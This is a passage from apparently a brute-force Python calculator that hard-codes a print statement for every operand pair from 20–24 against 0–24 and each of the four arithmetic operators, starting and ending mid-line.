print('20 * 17 = 340')\nif num_1 == 20 and num_2 == 17 and calc == '/': print('20 / 17 = 1.1764705882352942')\nif num_1 == 20 and num_2 == 18 and calc == '+': print('20 + 18 = 38')\nif num_1 == 20 and num_2 == 18 and calc == '-': print('20 - 18 = 2')\nif num_1 == 20 and num_2 == 18 and calc == '*': print('20 * 18 = 360')\nif num_1 == 20 and num_2 == 18 and calc == '/': print('20 / 18 = 1.1111111111111112')\nif num_1 == 20 and num_2 == 19 and calc == '+': print('20 + 19 = 39')\nif num_1 == 20 and num_2 == 19 and calc == '-': print('20 - 19 = 1')\nif num_1 == 20 and num_2 == 19 and calc == '*': print('20 * 19 = 380')\nif num_1 == 20 and num_2 == 19 and calc == '/': print('20 / 19 = 1.0526315789473684')\nif num_1 == 20 and num_2 == 20 and calc == '+': print('20 + 20 = 40')\nif num_1 == 20 and num_2 == 20 and calc == '-': print('20 - 20 = 0')\nif num_1 == 20 and num_2 == 20 and calc == '*': print('20 * 20 = 400')\nif num_1 == 20 and num_2 == 20 and calc == '/': print('20 / 20 = 1.0')\nif num_1 == 20 and num_2 == 21 and calc == '+': print('20 + 21 = 41')\nif num_1 == 20 and num_2 == 21 and calc == '-': print('20 - 21 = -1')\nif num_1 == 20 and num_2 == 21 and calc == '*': print('20 * 21 = 420')\nif num_1 == 20 and num_2 == 21 and calc == '/': print('20 / 21 = 0.9523809523809523')\nif num_1 == 20 and num_2 == 22 and calc == '+': print('20 + 22 = 42')\nif num_1 == 20 and num_2 == 22 and calc == '-': print('20 - 22 = -2')\nif num_1 == 20 and num_2 == 22 and calc == '*': print('20 * 22 = 440')\nif num_1 == 20 and num_2 == 22 and calc == '/': print('20 / 22 = 0.9090909090909091')\nif num_1 == 20 and num_2 == 23 and calc == '+': print('20 + 23 = 43')\nif num_1 == 20 and num_2 == 23 and calc == '-': print('20 - 23 = -3')\nif num_1 == 20 and num_2 == 23 and calc == '*': print('20 * 23 = 460')\nif num_1 == 20 and num_2 == 23 and calc == '/': print('20 / 23 = 0.8695652173913043')\nif num_1 == 20 and num_2 == 24 and calc == '+': print('20 + 24 = 44')\nif num_1 == 20 and num_2 == 24 and calc == '-': print('20 - 24 = -4')\nif num_1 == 20 and num_2 == 24 and calc == '*': print('20 * 24 = 480')\nif num_1 == 20 and num_2 == 24 and calc == '/': print('20 / 24 = 0.8333333333333334')\nif num_1 == 21 and num_2 == 0 and calc == '+': print('21 + 0 = 21')\nif num_1 == 21 and num_2 == 0 and calc == '-': print('21 - 0 = 21')\nif num_1 == 21 and num_2 == 0 and calc == '*': print('21 * 0 = 0')\nif num_1 == 21 and num_2 == 0 and calc == '/': print('21 / 0 = Cannot divide by zero!')\nif num_1 == 21 and num_2 == 1 and calc == '+': print('21 + 1 = 22')\nif num_1 == 21 and num_2 == 1 and calc == '-': print('21 - 1 = 20')\nif num_1 == 21 and num_2 == 1 and calc == '*': print('21 * 1 = 21')\nif num_1 == 21 and num_2 == 1 and calc == '/': print('21 / 1 = 21.0')\nif num_1 == 21 and num_2 == 2 and calc == '+': print('21 + 2 = 23')\nif num_1 == 21 and num_2 == 2 and calc == '-': print('21 - 2 = 19')\nif num_1 == 21 and num_2 == 2 and calc == '*': print('21 * 2 = 42')\nif num_1 == 21 and num_2 == 2 and calc == '/': print('21 / 2 = 10.5')\nif num_1 == 21 and num_2 == 3 and calc == '+': print('21 + 3 = 24')\nif num_1 == 21 and num_2 == 3 and calc == '-': print('21 - 3 = 18')\nif num_1 == 21 and num_2 == 3 and calc == '*': print('21 * 3 = 63')\nif num_1 == 21 and num_2 == 3 and calc == '/': print('21 / 3 = 7.0')\nif num_1 == 21 and num_2 == 4 and calc == '+': print('21 + 4 = 25')\nif num_1 == 21 and num_2 == 4 and calc == '-': print('21 - 4 = 17')\nif num_1 == 21 and num_2 == 4 and calc == '*': print('21 * 4 = 84')\nif num_1 == 21 and num_2 == 4 and calc == '/': print('21 / 4 = 5.25')\nif num_1 == 21 and num_2 == 5 and calc == '+': print('21 + 5 = 26')\nif num_1 == 21 and num_2 == 5 and calc == '-': print('21 - 5 = 16')\nif num_1 == 21 and num_2 == 5 and calc == '*': print('21 * 5 = 105')\nif num_1 == 21 and num_2 == 5 and calc == '/': print('21 / 5 = 4.2')\nif num_1 == 21 and num_2 == 6 and calc == '+': print('21 + 6 = 27')\nif num_1 == 21 and num_2 == 6 and calc == '-': print('21 - 6 = 15')\nif num_1 == 21 and num_2 == 6 and calc == '*': print('21 * 6 = 126')\nif num_1 == 21 and num_2 == 6 and calc == '/': print('21 / 6 = 3.5')\nif num_1 == 21 and num_2 == 7 and calc == '+': print('21 + 7 = 28')\nif num_1 == 21 and num_2 == 7 and calc == '-': print('21 - 7 = 14')\nif num_1 == 21 and num_2 == 7 and calc == '*': print('21 * 7 = 147')\nif num_1 == 21 and num_2 == 7 and calc == '/': print('21 / 7 = 3.0')\nif num_1 == 21 and num_2 == 8 and calc == '+': print('21 + 8 = 29')\nif num_1 == 21 and num_2 == 8 and calc == '-': print('21 - 8 = 13')\nif num_1 == 21 and num_2 == 8 and calc == '*': print('21 * 8 = 168')\nif num_1 == 21 and num_2 == 8 and calc == '/': print('21 / 8 = 2.625')\nif num_1 == 21 and num_2 == 9 and calc == '+': print('21 + 9 = 30')\nif num_1 == 21 and num_2 == 9 and calc == '-': print('21 - 9 = 12')\nif num_1 == 21 and num_2 == 9 and calc == '*': print('21 * 9 = 189')\nif num_1 == 21 and num_2 == 9 and calc == '/': print('21 / 9 = 2.3333333333333335')\nif num_1 == 21 and num_2 == 10 and calc == '+': print('21 + 10 = 31')\nif num_1 == 21 and num_2 == 10 and calc == '-': print('21 - 10 = 11')\nif num_1 == 21 and num_2 == 10 and calc == '*': print('21 * 10 = 210')\nif num_1 == 21 and num_2 == 10 and calc == '/': print('21 / 10 = 2.1')\nif num_1 == 21 and num_2 == 11 and calc == '+': print('21 + 11 = 32')\nif num_1 == 21 and num_2 == 11 and calc == '-': print('21 - 11 = 10')\nif num_1 == 21 and num_2 == 11 and calc == '*': print('21 * 11 = 231')\nif num_1 == 21 and num_2 == 11 and calc == '/': print('21 / 11 = 1.9090909090909092')\nif num_1 == 21 and num_2 == 12 and calc == '+': print('21 + 12 = 33')\nif num_1 == 21 and num_2 == 12 and calc == '-': print('21 - 12 = 9')\nif num_1 == 21 and num_2 == 12 and calc == '*': print('21 * 12 = 252')\nif num_1 == 21 and num_2 == 12 and calc == '/': print('21 / 12 = 1.75')\nif num_1 == 21 and num_2 == 13 and calc == '+': print('21 + 13 = 34')\nif num_1 == 21 and num_2 == 13 and calc == '-': print('21 - 13 = 8')\nif num_1 == 21 and num_2 == 13 and calc == '*': print('21 * 13 = 273')\nif num_1 == 21 and num_2 == 13 and calc == '/': print('21 / 13 = 1.6153846153846154')\nif num_1 == 21 and num_2 == 14 and calc == '+': print('21 + 14 = 35')\nif num_1 == 21 and num_2 == 14 and calc == '-': print('21 - 14 = 7')\nif num_1 == 21 and num_2 == 14 and calc == '*': print('21 * 14 = 294')\nif num_1 == 21 and num_2 == 14 and calc == '/': print('21 / 14 = 1.5')\nif num_1 == 21 and num_2 == 15 and calc == '+': print('21 + 15 = 36')\nif num_1 == 21 and num_2 == 15 and calc == '-': print('21 - 15 = 6')\nif num_1 == 21 and num_2 == 15 and calc == '*': print('21 * 15 = 315')\nif num_1 == 21 and num_2 == 15 and calc == '/': print('21 / 15 = 1.4')\nif num_1 == 21 and num_2 == 16 and calc == '+': print('21 + 16 = 37')\nif num_1 == 21 and num_2 == 16 and calc == '-': print('21 - 16 = 5')\nif num_1 == 21 and num_2 == 16 and calc == '*': print('21 * 16 = 336')\nif num_1 == 21 and num_2 == 16 and calc == '/': print('21 / 16 = 1.3125')\nif num_1 == 21 and num_2 == 17 and calc == '+': print('21 + 17 = 38')\nif num_1 == 21 and num_2 == 17 and calc == '-': print('21 - 17 = 4')\nif num_1 == 21 and num_2 == 17 and calc == '*': print('21 * 17 = 357')\nif num_1 == 21 and num_2 == 17 and calc == '/': print('21 / 17 = 1.2352941176470589')\nif num_1 == 21 and num_2 == 18 and calc == '+': print('21 + 18 = 39')\nif num_1 == 21 and num_2 == 18 and calc == '-': print('21 - 18 = 3')\nif num_1 == 21 and num_2 == 18 and calc == '*': print('21 * 18 = 378')\nif num_1 == 21 and num_2 == 18 and calc == '/': print('21 / 18 = 1.1666666666666667')\nif num_1 == 21 and num_2 == 19 and calc == '+': print('21 + 19 = 40')\nif num_1 == 21 and num_2 == 19 and calc == '-': print('21 - 19 = 2')\nif num_1 == 21 and num_2 == 19 and calc == '*': print('21 * 19 = 399')\nif num_1 == 21 and num_2 == 19 and calc == '/': print('21 / 19 = 1.105263157894737')\nif num_1 == 21 and num_2 == 20 and calc == '+': print('21 + 20 = 41')\nif num_1 == 21 and num_2 == 20 and calc == '-': print('21 - 20 = 1')\nif num_1 == 21 and num_2 == 20 and calc == '*': print('21 * 20 = 420')\nif num_1 == 21 and num_2 == 20 and calc == '/': print('21 / 20 = 1.05')\nif num_1 == 21 and num_2 == 21 and calc == '+': print('21 + 21 = 42')\nif num_1 == 21 and num_2 == 21 and calc == '-': print('21 - 21 = 0')\nif num_1 == 21 and num_2 == 21 and calc == '*': print('21 * 21 = 441')\nif num_1 == 21 and num_2 == 21 and calc == '/': print('21 / 21 = 1.0')\nif num_1 == 21 and num_2 == 22 and calc == '+': print('21 + 22 = 43')\nif num_1 == 21 and num_2 == 22 and calc == '-': print('21 - 22 = -1')\nif num_1 == 21 and num_2 == 22 and calc == '*': print('21 * 22 = 462')\nif num_1 == 21 and num_2 == 22 and calc == '/': print('21 / 22 = 0.9545454545454546')\nif num_1 == 21 and num_2 == 23 and calc == '+': print('21 + 23 = 44')\nif num_1 == 21 and num_2 == 23 and calc == '-': print('21 - 23 = -2')\nif num_1 == 21 and num_2 == 23 and calc == '*': print('21 * 23 = 483')\nif num_1 == 21 and num_2 == 23 and calc == '/': print('21 / 23 = 0.9130434782608695')\nif num_1 == 21 and num_2 == 24 and calc == '+': print('21 + 24 = 45')\nif num_1 == 21 and num_2 == 24 and calc == '-': print('21 - 24 = -3')\nif num_1 == 21 and num_2 == 24 and calc == '*': print('21 * 24 = 504')\nif num_1 == 21 and num_2 == 24 and calc == '/': print('21 / 24 = 0.875')\nif num_1 == 22 and num_2 == 0 and calc == '+': print('22 + 0 = 22')\nif num_1 == 22 and num_2 == 0 and calc == '-': print('22 - 0 = 22')\nif num_1 == 22 and num_2 == 0 and calc == '*': print('22 * 0 = 0')\nif num_1 == 22 and num_2 == 0 and calc == '/': print('22 / 0 = Cannot divide by zero!')\nif num_1 == 22 and num_2 == 1 and calc == '+': print('22 + 1 = 23')\nif num_1 == 22 and num_2 == 1 and calc == '-': print('22 - 1 = 21')\nif num_1 == 22 and num_2 == 1 and calc == '*': print('22 * 1 = 22')\nif num_1 == 22 and num_2 == 1 and calc == '/': print('22 / 1 = 22.0')\nif num_1 == 22 and num_2 == 2 and calc == '+': print('22 + 2 = 24')\nif num_1 == 22 and num_2 == 2 and calc == '-': print('22 - 2 = 20')\nif num_1 == 22 and num_2 == 2 and calc == '*': print('22 * 2 = 44')\nif num_1 == 22 and num_2 == 2 and calc == '/': print('22 / 2 = 11.0')\nif num_1 == 22 and num_2 == 3 and calc == '+': print('22 + 3 = 25')\nif num_1 == 22 and num_2 == 3 and calc == '-': print('22 - 3 = 19')\nif num_1 == 22 and num_2 == 3 and calc == '*': print('22 * 3 = 66')\nif num_1 == 22 and num_2 == 3 and calc == '/': print('22 / 3 = 7.333333333333333')\nif num_1 == 22 and num_2 == 4 and calc == '+': print('22 + 4 = 26')\nif num_1 == 22 and num_2 == 4 and calc == '-': print('22 - 4 = 18')\nif num_1 == 22 and num_2 == 4 and calc == '*': print('22 * 4 = 88')\nif num_1 == 22 and num_2 == 4 and calc == '/': print('22 / 4 = 5.5')\nif num_1 == 22 and num_2 == 5 and calc == '+': print('22 + 5 = 27')\nif num_1 == 22 and num_2 == 5 and calc == '-': print('22 - 5 = 17')\nif num_1 == 22 and num_2 == 5 and calc == '*': print('22 * 5 = 110')\nif num_1 == 22 and num_2 == 5 and calc == '/': print('22 / 5 = 4.4')\nif num_1 == 22 and num_2 == 6 and calc == '+': print('22 + 6 = 28')\nif num_1 == 22 and num_2 == 6 and calc == '-': print('22 - 6 = 16')\nif num_1 == 22 and num_2 == 6 and calc == '*': print('22 * 6 = 132')\nif num_1 == 22 and num_2 == 6 and calc == '/': print('22 / 6 = 3.6666666666666665')\nif num_1 == 22 and num_2 == 7 and calc == '+': print('22 + 7 = 29')\nif num_1 == 22 and num_2 == 7 and calc == '-': print('22 - 7 = 15')\nif num_1 == 22 and num_2 == 7 and calc == '*': print('22 * 7 = 154')\nif num_1 == 22 and num_2 == 7 and calc == '/': print('22 / 7 = 3.142857142857143')\nif num_1 == 22 and num_2 == 8 and calc == '+': print('22 + 8 = 30')\nif num_1 == 22 and num_2 == 8 and calc == '-': print('22 - 8 = 14')\nif num_1 == 22 and num_2 == 8 and calc == '*': print('22 * 8 = 176')\nif num_1 == 22 and num_2 == 8 and calc == '/': print('22 / 8 = 2.75')\nif num_1 == 22 and num_2 == 9 and calc == '+': print('22 + 9 = 31')\nif num_1 == 22 and num_2 == 9 and calc == '-': print('22 - 9 = 13')\nif num_1 == 22 and num_2 == 9 and calc == '*': print('22 * 9 = 198')\nif num_1 == 22 and num_2 == 9 and calc == '/': print('22 / 9 = 2.4444444444444446')\nif num_1 == 22 and num_2 == 10 and calc == '+': print('22 + 10 = 32')\nif num_1 == 22 and num_2 == 10 and calc == '-': print('22 - 10 = 12')\nif num_1 == 22 and num_2 == 10 and calc == '*': print('22 * 10 = 220')\nif num_1 == 22 and num_2 == 10 and calc == '/': print('22 / 10 = 2.2')\nif num_1 == 22 and num_2 == 11 and calc == '+': print('22 + 11 = 33')\nif num_1 == 22 and num_2 == 11 and calc == '-': print('22 - 11 = 11')\nif num_1 == 22 and num_2 == 11 and calc == '*': print('22 * 11 = 242')\nif num_1 == 22 and num_2 == 11 and calc == '/': print('22 / 11 = 2.0')\nif num_1 == 22 and num_2 == 12 and calc == '+': print('22 + 12 = 34')\nif num_1 == 22 and num_2 == 12 and calc == '-': print('22 - 12 = 10')\nif num_1 == 22 and num_2 == 12 and calc == '*': print('22 * 12 = 264')\nif num_1 == 22 and num_2 == 12 and calc == '/': print('22 / 12 = 1.8333333333333333')\nif num_1 == 22 and num_2 == 13 and calc == '+': print('22 + 13 = 35')\nif num_1 == 22 and num_2 == 13 and calc == '-': print('22 - 13 = 9')\nif num_1 == 22 and num_2 == 13 and calc == '*': print('22 * 13 = 286')\nif num_1 == 22 and num_2 == 13 and calc == '/': print('22 / 13 = 1.6923076923076923')\nif num_1 == 22 and num_2 == 14 and calc == '+': print('22 + 14 = 36')\nif num_1 == 22 and num_2 == 14 and calc == '-': print('22 - 14 = 8')\nif num_1 == 22 and num_2 == 14 and calc == '*': print('22 * 14 = 308')\nif num_1 == 22 and num_2 == 14 and calc == '/': print('22 / 14 = 1.5714285714285714')\nif num_1 == 22 and num_2 == 15 and calc == '+': print('22 + 15 = 37')\nif num_1 == 22 and num_2 == 15 and calc == '-': print('22 - 15 = 7')\nif num_1 == 22 and num_2 == 15 and calc == '*': print('22 * 15 = 330')\nif num_1 == 22 and num_2 == 15 and calc == '/': print('22 / 15 = 1.4666666666666666')\nif num_1 == 22 and num_2 == 16 and calc == '+': print('22 + 16 = 38')\nif num_1 == 22 and num_2 == 16 and calc == '-': print('22 - 16 = 6')\nif num_1 == 22 and num_2 == 16 and calc == '*': print('22 * 16 = 352')\nif num_1 == 22 and num_2 == 16 and calc == '/': print('22 / 16 = 1.375')\nif num_1 == 22 and num_2 == 17 and calc == '+': print('22 + 17 = 39')\nif num_1 == 22 and num_2 == 17 and calc == '-': print('22 - 17 = 5')\nif num_1 == 22 and num_2 == 17 and calc == '*': print('22 * 17 = 374')\nif num_1 == 22 and num_2 == 17 and calc == '/': print('22 / 17 = 1.2941176470588236')\nif num_1 == 22 and num_2 == 18 and calc == '+': print('22 + 18 = 40')\nif num_1 == 22 and num_2 == 18 and calc == '-': print('22 - 18 = 4')\nif num_1 == 22 and num_2 == 18 and calc == '*': print('22 * 18 = 396')\nif num_1 == 22 and num_2 == 18 and calc == '/': print('22 / 18 = 1.2222222222222223')\nif num_1 == 22 and num_2 == 19 and calc == '+': print('22 + 19 = 41')\nif num_1 == 22 and num_2 == 19 and calc == '-': print('22 - 19 = 3')\nif num_1 == 22 and num_2 == 19 and calc == '*': print('22 * 19 = 418')\nif num_1 == 22 and num_2 == 19 and calc == '/': print('22 / 19 = 1.1578947368421053')\nif num_1 == 22 and num_2 == 20 and calc == '+': print('22 + 20 = 42')\nif num_1 == 22 and num_2 == 20 and calc == '-': print('22 - 20 = 2')\nif num_1 == 22 and num_2 == 20 and calc == '*': print('22 * 20 = 440')\nif num_1 == 22 and num_2 == 20 and calc == '/': print('22 / 20 = 1.1')\nif num_1 == 22 and num_2 == 21 and calc == '+': print('22 + 21 = 43')\nif num_1 == 22 and num_2 == 21 and calc == '-': print('22 - 21 = 1')\nif num_1 == 22 and num_2 == 21 and calc == '*': print('22 * 21 = 462')\nif num_1 == 22 and num_2 == 21 and calc == '/': print('22 / 21 = 1.0476190476190477')\nif num_1 == 22 and num_2 == 22 and calc == '+': print('22 + 22 = 44')\nif num_1 == 22 and num_2 == 22 and calc == '-': print('22 - 22 = 0')\nif num_1 == 22 and num_2 == 22 and calc == '*': print('22 * 22 = 484')\nif num_1 == 22 and num_2 == 22 and calc == '/': print('22 / 22 = 1.0')\nif num_1 == 22 and num_2 == 23 and calc == '+': print('22 + 23 = 45')\nif num_1 == 22 and num_2 == 23 and calc == '-': print('22 - 23 = -1')\nif num_1 == 22 and num_2 == 23 and calc == '*': print('22 * 23 = 506')\nif num_1 == 22 and num_2 == 23 and calc == '/': print('22 / 23 = 0.9565217391304348')\nif num_1 == 22 and num_2 == 24 and calc == '+': print('22 + 24 = 46')\nif num_1 == 22 and num_2 == 24 and calc == '-': print('22 - 24 = -2')\nif num_1 == 22 and num_2 == 24 and calc == '*': print('22 * 24 = 528')\nif num_1 == 22 and num_2 == 24 and calc == '/': print('22 / 24 = 0.9166666666666666')\nif num_1 == 23 and num_2 == 0 and calc == '+': print('23 + 0 = 23')\nif num_1 == 23 and num_2 == 0 and calc == '-': print('23 - 0 = 23')\nif num_1 == 23 and num_2 == 0 and calc == '*': print('23 * 0 = 0')\nif num_1 == 23 and num_2 == 0 and calc == '/': print('23 / 0 = Cannot divide by zero!')\nif num_1 == 23 and num_2 == 1 and calc == '+': print('23 + 1 = 24')\nif num_1 == 23 and num_2 == 1 and calc == '-': print('23 - 1 = 22')\nif num_1 == 23 and num_2 == 1 and calc == '*': print('23 * 1 = 23')\nif num_1 == 23 and num_2 == 1 and calc == '/': print('23 / 1 = 23.0')\nif num_1 == 23 and num_2 == 2 and calc == '+': print('23 + 2 = 25')\nif num_1 == 23 and num_2 == 2 and calc == '-': print('23 - 2 = 21')\nif num_1 == 23 and num_2 == 2 and calc == '*': print('23 * 2 = 46')\nif num_1 == 23 and num_2 == 2 and calc == '/': print('23 / 2 = 11.5')\nif num_1 == 23 and num_2 == 3 and calc == '+': print('23 + 3 = 26')\nif num_1 == 23 and num_2 == 3 and calc == '-': print('23 - 3 = 20')\nif num_1 == 23 and num_2 == 3 and calc == '*': print('23 * 3 = 69')\nif num_1 == 23 and num_2 == 3 and calc == '/': print('23 / 3 = 7.666666666666667')\nif num_1 == 23 and num_2 == 4 and calc == '+': print('23 + 4 = 27')\nif num_1 == 23 and num_2 == 4 and calc == '-': print('23 - 4 = 19')\nif num_1 == 23 and num_2 == 4 and calc == '*': print('23 * 4 = 92')\nif num_1 == 23 and num_2 == 4 and calc == '/': print('23 / 4 = 5.75')\nif num_1 == 23 and num_2 == 5 and calc == '+': print('23 + 5 = 28')\nif num_1 == 23 and num_2 == 5 and calc == '-': print('23 - 5 = 18')\nif num_1 == 23 and num_2 == 5 and calc == '*': print('23 * 5 = 115')\nif num_1 == 23 and num_2 == 5 and calc == '/': print('23 / 5 = 4.6')\nif num_1 == 23 and num_2 == 6 and calc == '+': print('23 + 6 = 29')\nif num_1 == 23 and num_2 == 6 and calc == '-': print('23 - 6 = 17')\nif num_1 == 23 and num_2 == 6 and calc == '*': print('23 * 6 = 138')\nif num_1 == 23 and num_2 == 6 and calc == '/': print('23 / 6 = 3.8333333333333335')\nif num_1 == 23 and num_2 == 7 and calc == '+': print('23 + 7 = 30')\nif num_1 == 23 and num_2 == 7 and calc == '-': print('23 - 7 = 16')\nif num_1 == 23 and num_2 == 7 and calc == '*': print('23 * 7 = 161')\nif num_1 == 23 and num_2 == 7 and calc == '/': print('23 / 7 = 3.2857142857142856')\nif num_1 == 23 and num_2 == 8 and calc == '+': print('23 + 8 = 31')\nif num_1 == 23 and num_2 == 8 and calc == '-': print('23 - 8 = 15')\nif num_1 == 23 and num_2 == 8 and calc == '*': print('23 * 8 = 184')\nif num_1 == 23 and num_2 == 8 and calc == '/': print('23 / 8 = 2.875')\nif num_1 == 23 and num_2 == 9 and calc == '+': print('23 + 9 = 32')\nif num_1 == 23 and num_2 == 9 and calc == '-': print('23 - 9 = 14')\nif num_1 == 23 and num_2 == 9 and calc == '*': print('23 * 9 = 207')\nif num_1 == 23 and num_2 == 9 and calc == '/': print('23 / 9 = 2.5555555555555554')\nif num_1 == 23 and num_2 == 10 and calc == '+': print('23 + 10 = 33')\nif num_1 == 23 and num_2 == 10 and calc == '-': print('23 - 10 = 13')\nif num_1 == 23 and num_2 == 10 and calc == '*': print('23 * 10 = 230')\nif num_1 == 23 and num_2 == 10 and calc == '/': print('23 / 10 = 2.3')\nif num_1 == 23 and num_2 == 11 and calc == '+': print('23 + 11 = 34')\nif num_1 == 23 and num_2 == 11 and calc == '-': print('23 - 11 = 12')\nif num_1 == 23 and num_2 == 11 and calc == '*': print('23 * 11 = 253')\nif num_1 == 23 and num_2 == 11 and calc == '/': print('23 / 11 = 2.090909090909091')\nif num_1 == 23 and num_2 == 12 and calc == '+': print('23 + 12 = 35')\nif num_1 == 23 and num_2 == 12 and calc == '-': print('23 - 12 = 11')\nif num_1 == 23 and num_2 == 12 and calc == '*': print('23 * 12 = 276')\nif num_1 == 23 and num_2 == 12 and calc == '/': print('23 / 12 = 1.9166666666666667')\nif num_1 == 23 and num_2 == 13 and calc == '+': print('23 + 13 = 36')\nif num_1 == 23 and num_2 == 13 and calc == '-': print('23 - 13 = 10')\nif num_1 == 23 and num_2 == 13 and calc == '*': print('23 * 13 = 299')\nif num_1 == 23 and num_2 == 13 and calc == '/': print('23 / 13 = 1.7692307692307692')\nif num_1 == 23 and num_2 == 14 and calc == '+': print('23 + 14 = 37')\nif num_1 == 23 and num_2 == 14 and calc == '-': print('23 - 14 = 9')\nif num_1 == 23 and num_2 == 14 and calc == '*': print('23 * 14 = 322')\nif num_1 == 23 and num_2 == 14 and calc == '/': print('23 / 14 = 1.6428571428571428')\nif num_1 == 23 and num_2 == 15 and calc == '+': print('23 + 15 = 38')\nif num_1 == 23 and num_2 == 15 and calc == '-': print('23 - 15 = 8')\nif num_1 == 23 and num_2 == 15 and calc == '*': print('23 * 15 = 345')\nif num_1 == 23 and num_2 == 15 and calc == '/': print('23 / 15 = 1.5333333333333334')\nif num_1 == 23 and num_2 == 16 and calc == '+': print('23 + 16 = 39')\nif num_1 == 23 and num_2 == 16 and calc == '-': print('23 - 16 = 7')\nif num_1 == 23 and num_2 == 16 and calc == '*': print('23 * 16 = 368')\nif num_1 == 23 and num_2 == 16 and calc == '/': print('23 / 16 = 1.4375')\nif num_1 == 23 and num_2 == 17 and calc == '+': print('23 + 17 = 40')\nif num_1 == 23 and num_2 == 17 and calc == '-': print('23 - 17 = 6')\nif num_1 == 23 and num_2 == 17 and calc == '*': print('23 * 17 = 391')\nif num_1 == 23 and num_2 == 17 and calc == '/': print('23 / 17 = 1.3529411764705883')\nif num_1 == 23 and num_2 == 18 and calc == '+': print('23 + 18 = 41')\nif num_1 == 23 and num_2 == 18 and calc == '-': print('23 - 18 = 5')\nif num_1 == 23 and num_2 == 18 and calc == '*': print('23 * 18 = 414')\nif num_1 == 23 and num_2 == 18 and calc == '/': print('23 / 18 = 1.2777777777777777')\nif num_1 == 23 and num_2 == 19 and calc == '+': print('23 + 19 = 42')\nif num_1 == 23 and num_2 == 19 and calc == '-': print('23 - 19 = 4')\nif num_1 == 23 and num_2 == 19 and calc == '*': print('23 * 19 = 437')\nif num_1 == 23 and num_2 == 19 and calc == '/': print('23 / 19 = 1.2105263157894737')\nif num_1 == 23 and num_2 == 20 and calc == '+': print('23 + 20 = 43')\nif num_1 == 23 and num_2 == 20 and calc == '-': print('23 - 20 = 3')\nif num_1 == 23 and num_2 == 20 and calc == '*': print('23 * 20 = 460')\nif num_1 == 23 and num_2 == 20 and calc == '/': print('23 / 20 = 1.15')\nif num_1 == 23 and num_2 == 21 and calc == '+': print('23 + 21 = 44')\nif num_1 == 23 and num_2 == 21 and calc == '-': print('23 - 21 = 2')\nif num_1 == 23 and num_2 == 21 and calc == '*': print('23 * 21 = 483')\nif num_1 == 23 and num_2 == 21 and calc == '/': print('23 / 21 = 1.0952380952380953')\nif num_1 == 23 and num_2 == 22 and calc == '+': print('23 + 22 = 45')\nif num_1 == 23 and num_2 == 22 and calc == '-': print('23 - 22 = 1')\nif num_1 == 23 and num_2 == 22 and calc == '*': print('23 * 22 = 506')\nif num_1 == 23 and num_2 == 22 and calc == '/': print('23 / 22 = 1.0454545454545454')\nif num_1 == 23 and num_2 == 23 and calc == '+': print('23 + 23 = 46')\nif num_1 == 23 and num_2 == 23 and calc == '-': print('23 - 23 = 0')\nif num_1 == 23 and num_2 == 23 and calc == '*': print('23 * 23 = 529')\nif num_1 == 23 and num_2 == 23 and calc == '/': print('23 / 23 = 1.0')\nif num_1 == 23 and num_2 == 24 and calc == '+': print('23 + 24 = 47')\nif num_1 == 23 and num_2 == 24 and calc == '-': print('23 - 24 = -1')\nif num_1 == 23 and num_2 == 24 and calc == '*': print('23 * 24 = 552')\nif num_1 == 23 and num_2 == 24 and calc == '/': print('23 / 24 = 0.9583333333333334')\nif num_1 == 24 and num_2 == 0 and calc == '+': print('24 + 0 = 24')\nif num_1 == 24 and num_2 == 0 and calc == '-': print('24 - 0 = 24')\nif num_1 == 24 and num_2 == 0 and calc == '*': print('24 * 0 = 0')\nif num_1 == 24 and num_2 == 0 and calc == '/': print('24 / 0 = Cannot divide by zero!')\nif num_1 == 24 and num_2 == 1 and calc == '+': print('24 + 1 = 25')\nif num_1 == 24 and num_2 == 1 and calc == '-': print('24 - 1 = 23')\nif num_1 == 24 and num_2 == 1 and calc == '*': print('24 * 1 = 24')\nif num_1 == 24 and num_2 == 1 and calc == '/': print('24 / 1 = 24.0')\nif num_1 == 24 and num_2 == 2 and calc == '+': print('24 + 2 = 26')\nif num_1 == 24 and num_2 == 2 and calc == '-': print('24 - 2 = 22')\nif num_1 == 24 and num_2 == 2 and calc == '*': print('24 * 2 = 48')\nif num_1 == 24 and num_2 == 2 and calc == '/': print('24 / 2 = 12.0')\nif num_1 == 24 and num_2 == 3 and calc == '+': print('24 + 3 = 27')\nif num_1 == 24 and num_2 == 3 and calc == '-': print('24 - 3 = 21')\nif num_1 == 24 and num_2 == 3 and calc == '*': print('24 * 3 = 72')\nif num_1 == 24 and num_2 == 3 and calc == '/': print('24 / 3 = 8.0')\nif num_1 == 24 and num_2 == 4 and calc == '+': print('24 + 4 = 28')\nif num_1 == 24 and num_2 == 4 and calc == '-': print('24 - 4 = 20')\nif num_1 == 24 and num_2 == 4 and calc == '*': print('24 * 4 = 96')\nif num_1 == 24 and num_2 == 4 and calc == '/': print('24 / 4 = 6.0')\nif num_1 == 24 and num_2 == 5 and calc == '+': print('24 + 5 = 29')\nif num_1 == 24 and num_2 == 5 and calc == '-': print('24 - 5 = 19')\nif num_1 == 24 and num_2 == 5 and calc == '*': print('24 * 5 = 120')\nif num_1 == 24 and num_2 == 5 and calc == '/': print('24 / 5 = 4.8')\nif num_1 == 24 and num_2 == 6 and calc == '+': print('24 + 6 = 30')\nif num_1 == 24 and num_2 == 6 and calc == '-': print('24 - 6 = 18')\nif num_1 == 24 and num_2 == 6 and calc == '*': print('24 * 6 = 144')\nif num_1 == 24 and num_2 == 6 and calc == '/': print('24 / 6 = 4.0')\nif num_1 == 24 and num_2 == 7 and calc == '+': print('24 + 7 = 31')\nif num_1 == 24 and num_2 == 7 and calc == '-': print('24 - 7 = 17')\nif num_1 == 24 and num_2 == 7 and calc == '*': print('24 * 7 = 168')\nif num_1 == 24 and num_2 == 7 and calc == '/': print('24 / 7 = 3.4285714285714284')\nif num_1 == 24 and num_2 == 8 and calc == '+': print('24 + 8 = 32')\nif num_1 == 24 and num_2 == 8 and calc == '-': print('24 - 8 = 16')\nif num_1 == 24 and num_2 == 8 and calc == '*': print('24 * 8 = 192')\nif num_1 == 24 and num_2 == 8 and calc == '/': print('24 / 8 = 3.0')\nif num_1 == 24 and num_2 == 9 and calc == '+': print('24 + 9 = 33')\nif num_1 == 24 and num_2 == 9 and calc == '-': print('24 - 9 = 15')\nif num_1 == 24 and num_2 == 9 and calc == '*': print('24 * 9 = 216')\nif num_1 == 24 and num_2 == 9 and calc == '/': print('24 / 9 = 2.6666666666666665')\nif num_1 == 24 and num_2 == 10 and calc == '+': print('24 + 10 = 34')\nif num_1 == 24 and num_2 == 10 and calc == '-': print('24 - 10 = 14')\nif num_1 == 24 and num_2 == 10 and calc == '*': print('24 * 10 = 240')\nif num_1 == 24 and num_2 == 10 and calc == '/': print('24 / 10 = 